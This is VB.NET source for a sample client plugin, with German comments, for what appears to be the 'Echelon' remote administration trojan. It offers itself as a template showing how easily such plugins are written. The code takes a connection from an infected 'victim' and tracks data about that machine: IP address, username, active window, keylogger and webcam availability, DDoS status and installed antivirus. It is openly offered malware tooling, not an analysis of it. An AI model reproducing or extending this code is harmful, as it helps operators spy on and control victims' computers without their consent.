Imports EchelonPluginInterface.Class1

Public Class PlugIn

    Implements myInterface
    Const I_AM_CLIENT = &H0
    Const I_AM_SERVER = &H1
    Const I_AM_TOOL = &H3

    '                   Wichtig, diese Werte müssen von Ihnen angegeben werden.
    '########################################################################################
    Private PlugInType As Integer = I_AM_CLIENT 'Angeben, dass es sich um ein Client PlugIn handelt
    Private PlugInName As String = "Krusty´s Echelon PlugIn" 'Den namen des PlugIns angeben, muss mit dem Server PlugIn übereinstimmen
    Private PlugInInformation As String = "Programmiert von Krusty" 'Programmierer oder Version angeben
    Private PlugInBeschreibung As String = "Dieses PlugIn ist nur ein Vorzeige PlugIn." & vbNewLine & _
    "Es soll euch zeigen, wie einfach mal PlugIns Für Echelon Programmieren kann." 'Beschreibung des PlugIns angeben
    '########################################################################################



    Dim f As New Form1
    Public Function CloseMe() As Object Implements EchelonPluginInterface.Class1.myInterface.CloseMe
        Return Nothing
    End Function
    Public Function GetConnection(ByVal Tcp_Client As System.Net.Sockets.TcpClient) As Object Implements EchelonPluginInterface.Class1.myInterface.GetConnection
        Try
            Dim v As New VictimConnection
            v.GetConnection(Tcp_Client)
            f.VictimVerbindung = v
            f.ShowDialog()
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Function GetPlugDescription() As String Implements EchelonPluginInterface.Class1.myInterface.GetPlugDescription
        Return PlugInBeschreibung
    End Function

    Public Function getPlugInInfo() As String Implements EchelonPluginInterface.Class1.myInterface.getPlugInInfo
        Return PlugInInformation
    End Function

    Public Function GetPlugInName() As String Implements EchelonPluginInterface.Class1.myInterface.GetPlugInName
        Return PlugInName
    End Function

    Public Function GetPlugInType() As Integer Implements EchelonPluginInterface.Class1.myInterface.GetPlugInType
        Return PlugInType
    End Function

    Public Function StartMe(ByVal VictimInformations() As String) As Object Implements EchelonPluginInterface.Class1.myInterface.StartMe
        'PlugIn wurde geladen, es besteht aber noch keine verbindung
        Try
            Victim.IpAdresse = VictimInformations(0).ToString
            Victim.ComputerUsername = VictimInformations(1).ToString
            Victim.RemotePort = CInt(VictimInformations(2).ToString)
            Victim.VictimName = VictimInformations(3)
            Victim.AktuellesFenster = VictimInformations(4)
            Victim.Herkunft = VictimInformations(5)
            Victim.ServerVersion = VictimInformations(6)
            Victim.System = VictimInformations(7)
            Victim.Ping = VictimInformations(8)
            If VictimInformations(9) = "Ja" Then Victim.OfflineKeylogger = True Else Victim.OfflineKeylogger = False
            If VictimInformations(10) = "Ja" Then Victim.Webcam = True Else Victim.Webcam = False
            Victim.VictimID = CInt(VictimInformations(11))
            Victim.DDOS = VictimInformations(12)
            Victim.AvSystem = VictimInformations(13)
            Victim.VictimNotiz = VictimInformations(14)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function



    Public Class Victim
        Public Shared IpAdresse As String
        Public Shared ComputerUsername As String
        Public Shared RemotePort As Integer
        Public Shared VictimName As String
        Public Shared AktuellesFenster As String
        Public Shared Herkunft As String
        Public Shared System As String
        Public Shared ServerVersion As String
        Public Shared Ping As String
        Public Shared OfflineKeylogger As Boolean
        Public Shared Webcam As Boolean
        Public Shared VictimID As Integer
        Public Shared DDOS As String
        Public Shared AvSystem As String
        Public Shared VictimNotiz As String
    End Class

End Class
